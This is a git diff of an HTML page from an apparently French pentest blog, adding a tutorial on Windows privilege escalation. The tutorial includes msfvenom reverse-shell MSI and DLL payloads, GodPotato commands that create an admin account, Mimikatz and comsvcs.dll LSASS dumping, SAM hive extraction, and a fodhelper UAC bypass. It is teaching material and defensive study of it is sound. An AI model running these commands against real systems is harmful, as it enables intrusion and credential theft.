@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Élévation de privilèges Windows : techniques avancées — Temgus.CyberBlog</title>
 <meta name="description" content="AlwaysInstallElevated, services vulnérables, tokens d'impersonation, GodPotato, WinPEAS — privesc Windows complet.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-windows.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-windows.html">
 <meta property="og:title" content="Élévation de privilèges Windows : techniques avancées — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Élévation de privilèges Windows : techniques avancées — Temgus.CyberBlog">
 <meta name="twitter:description" content="AlwaysInstallElevated, services vulnérables, tokens d'impersonation, GodPotato, WinPEAS — privesc Windows complet.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,465 @@
   "headline": "Élévation de privilèges Windows : techniques avancées",
   "description": "AlwaysInstallElevated, services vulnérables, tokens d'impersonation, GodPotato, WinPEAS — privesc Windows complet.",
   "datePublished": "2025-08-19",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-windows.html",
   "inLanguage": "fr",
   "keywords": "privesc, Windows, WinPEAS, GodPotato, SYSTEM",
-  "timeRequired": "PT13M"
+  "timeRequired": "PT13M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🪟</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Élévation de privilèges Windows : techniques avancées</h1>
-  <p style="color:#8892a4;max-width:500px">AlwaysInstallElevated, services vulnérables, tokens d'impersonation, GodPotato, WinPEAS — privesc Windows complet.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#privilege-escalation-windows" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🪟</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Élévation de privilèges Windows : techniques avancées</div>
+      <div class="meta-details">
+        <span>📅 2025-08-19</span>
+        <span>⏱ 13 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#contexte-windows">Contexte Windows</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#niveaux-de-privil-ges">Niveaux de privilèges</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#outils-essentiels">Outils essentiels</a></li>
+<li><a href="#-num-ration-manuelle">Énumération manuelle</a></li>
+<li><a href="#vecteurs-courants">Vecteurs courants</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#1-alwaysinstallelevated">1. AlwaysInstallElevated</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#2-services-mal-configur-s">2. Services mal configurés</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#3-t-ches-planifi-es">3. Tâches planifiées</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#4-dll-hijacking">4. DLL Hijacking</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#5-tokens-d-impersonation">5. Tokens d'impersonation</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#6-mots-de-passe-dans-le-registre">6. Mots de passe dans le registre</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#7-dumper-les-credentials">7. Dumper les credentials</a></li>
+<li><a href="#winpeas-num-ration-automatis-e">WinPEAS — Énumération automatisée</a></li>
+<li><a href="#bypass-uac">Bypass UAC</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Élévation de privilèges Windows : techniques avancées</h1>
+
+<p>L'élévation de privilèges sur Windows est une étape clé de tout pentest. Passer d'un utilisateur standard à SYSTEM ou Administrateur ouvre toutes les portes. Voici les techniques les plus utilisées.</p>
+
+<h2 id="contexte-windows">Contexte Windows</h2>
+
+<h3 id="niveaux-de-privil-ges">Niveaux de privilèges</h3>
+<ul><li><strong>User standard</strong> : droits limités, pas d'accès aux zones sensibles</li><li><strong>Administrateur local</strong> : droits élevés sur la machine locale</li><li><strong>SYSTEM</strong> : compte le plus puissant, utilisé par le système d'exploitation</li><li><strong>Administrateur de domaine</strong> : droits sur tout le domaine Active Directory</li></ul>
+
+<h3 id="outils-essentiels">Outils essentiels</h3>
+<ul><li><strong>WinPEAS</strong> : script d'énumération automatisé</li><li><strong>PowerUp</strong> : module PowerShell pour la privesc</li><li><strong>SharpUp</strong> : version C# de PowerUp</li><li><strong>BeRoot</strong> : outil d'énumération multi-plateforme</li></ul>
+
+<h2 id="-num-ration-manuelle">Énumération manuelle</h2>
+
+<pre><code class="language-powershell"># Informations système
+<p>systeminfo</p>
+<p>hostname</p>
+<p>whoami /all          # Droits et groupes de l'utilisateur courant</p>
+<p>whoami /priv         # Privilèges détaillés</p>
+
+<h1>Utilisateurs et groupes</h1>
+<p>net user</p>
+<p>net localgroup administrators</p>
+<p>net user USERNAME</p>
+
+<h1>Processus</h1>
+<p>tasklist /SVC</p>
+<p>Get-Process | Select-Object Name, Id, Path</p>
+
+<h1>Services</h1>
+<p>sc query</p>
+<p>Get-Service</p>
+<p>wmic service list brief</p>
+
+<h1>Réseau</h1>
+<p>ipconfig /all</p>
+<p>netstat -ano</p>
+<p>route print</code></pre>
+
+<h2 id="vecteurs-courants">Vecteurs courants</h2>
+
+<h3 id="1-alwaysinstallelevated">1. AlwaysInstallElevated</h3>
+
+<p>Si cette politique est activée, tous les installeurs MSI s'exécutent avec les droits SYSTEM.</p>
+
+<pre><code class="language-powershell"># Vérifier
+<p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+<p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+
+<h1>Si les deux valeurs = 1, créer un MSI malveillant</h1>
+<p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o exploit.msi</p>
+
+<h1>Exécuter sur la cible</h1>
+<p>msiexec /quiet /qn /i exploit.msi</code></pre>
+
+<h3 id="2-services-mal-configur-s">2. Services mal configurés</h3>
+
+<pre><code class="language-powershell"># Services avec chemin non entre guillemets (Unquoted Service Path)
+<p>wmic service get name,displayname,pathname,startmode |</p>
+<p>findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</p>
+
+<h1>Exemple vulnérable :</h1>
+<h1>C:\Program Files\My App\service.exe</h1>
+<h1>Windows cherche dans l'ordre :</h1>
+<h1>C:\Program.exe</h1>
+<h1>C:\Program Files\My.exe  ← Créer ce fichier !</h1>
+<h1>C:\Program Files\My App\service.exe</h1>
+
+<h1>Vérifier les permissions sur les binaires de services</h1>
+<p>icalcs "C:\Program Files\Vulnerable Service\service.exe"</p>
+<h1>Si BUILTIN\Users: (F) → remplacer le binaire</h1>
+
+<h1>Avec PowerUp</h1>
+<p>Import-Module .\PowerUp.ps1</p>
+<p>Get-ServiceUnquoted</p>
+<p>Get-ModifiableServiceFile</code></pre>
+
+<h3 id="3-t-ches-planifi-es">3. Tâches planifiées</h3>
+
+<pre><code class="language-powershell"># Lister les tâches planifiées
+<p>schtasks /query /fo LIST /v</p>
+<p>Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}</p>
+
+<h1>Vérifier si le script exécuté est modifiable</h1>
+<p>Get-ScheduledTask | Select-Object TaskName, TaskPath,</p>
+<p>@{N='Execute';E={$_.Actions.Execute}}</code></pre>
+
+<h3 id="4-dll-hijacking">4. DLL Hijacking</h3>
+
+<p>Windows cherche les DLLs dans un ordre précis. Si un dossier dans le PATH est writable, vous pouvez y placer une DLL malveillante.</p>
+
+<pre><code class="language-powershell"># Trouver les DLLs manquantes avec Process Monitor (Sysinternals)
+<h1>Filtrer : Result = NAME NOT FOUND, Path ends with .dll</h1>
+
+<h1>Vérifier les dossiers dans le PATH</h1>
+<p>$env:PATH -split ";" | ForEach-Object {</p>
+<p>if (Test-Path $_) { Get-Acl $_ | Select-Object Path, Access }</p>
+<p>}</p>
+
+<h1>Créer la DLL malveillante</h1>
+<p>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 \</p>
+<p>-f dll -o malicious.dll</code></pre>
+
+<h3 id="5-tokens-d-impersonation">5. Tokens d'impersonation</h3>
+
+<p>Si vous avez le privilège <code>SeImpersonatePrivilege</code> (compte de service, IIS...) :</p>
+
+<pre><code class="language-powershell"># Vérifier les privilèges
+<p>whoami /priv</p>
+
+<h1>Si SeImpersonatePrivilege présent :</h1>
+<h1>Outils : PrintSpoofer, GodPotato, JuicyPotato, RoguePotato</h1>
+
+<h1>PrintSpoofer (Windows 10/Server 2019+)</h1>
+<p>.\PrintSpoofer.exe -i -c cmd</p>
+
+<h1>GodPotato (le plus récent, très fiable)</h1>
+<p>.\GodPotato.exe -cmd "cmd /c whoami"</p>
+<p>.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add &amp;&amp; net localgroup administrators hacker /add"</code></pre>
+
+<h3 id="6-mots-de-passe-dans-le-registre">6. Mots de passe dans le registre</h3>
+
+<pre><code class="language-powershell"># Autologon
+<p>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</p>
+
+<h1>Mots de passe putty</h1>
+<p>reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s</p>
+
+<h1>Mots de passe enregistrés</h1>
+<p>cmdkey /list</code></pre>
+
+<h3 id="7-dumper-les-credentials">7. Dumper les credentials</h3>
+
+<pre><code class="language-powershell"># LSASS (nécessite SYSTEM ou admin)
+<h1>Avec Mimikatz</h1>
+<p>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</p>
+
+<h1>Avec rundll32 (moins détecté)</h1>
+<p>rundll32 C:\windows\system32\comsvcs.dll MiniDump</p>
+<p>(Get-Process lsass).Id C:\temp\lsass.dmp full</p>
+
+<h1>SAM database (hors ligne)</h1>
+<p>reg save HKLM\SYSTEM system.hive</p>
+<p>reg save HKLM\SAM sam.hive</p>
+<h1>Puis sur votre machine :</h1>
+<p>impacket-secretsdump -system system.hive -sam sam.hive LOCAL</code></pre>
+
+<h2 id="winpeas-num-ration-automatis-e">WinPEAS — Énumération automatisée</h2>
+
+<pre><code class="language-powershell"># Télécharger et exécuter
+<p>.\winPEASx64.exe</p>
+
+<h1>Version colorée (plus lisible)</h1>
+<p>.\winPEASx64.exe quiet</p>
+
+<h1>Sauvegarder la sortie</h1>
+<p>.\winPEASx64.exe &gt; C:\temp\winpeas_output.txt</code></pre>
+
+<h2 id="bypass-uac">Bypass UAC</h2>
+
+<p>Si vous êtes administrateur mais pas élevé :</p>
+
+<pre><code class="language-powershell"># Vérifier le niveau UAC
+<p>(Get-ItemProperty</p>
+<p>"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").ConsentPromptBehaviorAdmin</p>
+
+<h1>Techniques de bypass UAC</h1>
+<h1>fodhelper.exe (Windows 10)</h1>
+<p>New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force</p>
+<p>New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" <code></p>
+<p>-Name "DelegateExecute" -Value "" -Force</p>
+<p>Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" </code></p>
+<p>-Name "(default)" -Value "cmd /c start cmd.exe" -Force</p>
+<p>Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden</code></pre>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>La privesc Windows est un domaine riche qui évolue constamment. WinPEAS couvre 90% des cas automatiquement, mais comprendre les techniques manuelles reste indispensable. Pratiquez sur TryHackMe (room "Windows Privesc") et HackTheBox pour maîtriser ces vecteurs dans des contextes réels.</p>
+</article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#privilege-escalation-windows" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/privilege-escalation-linux.html" class="nav-prev">← Élévation de privilèges Linux : techniques et méthodes</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/recon-web-enumeration.html" class="nav-next">Reconnaissance web : énumération et cartographie des cibles →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
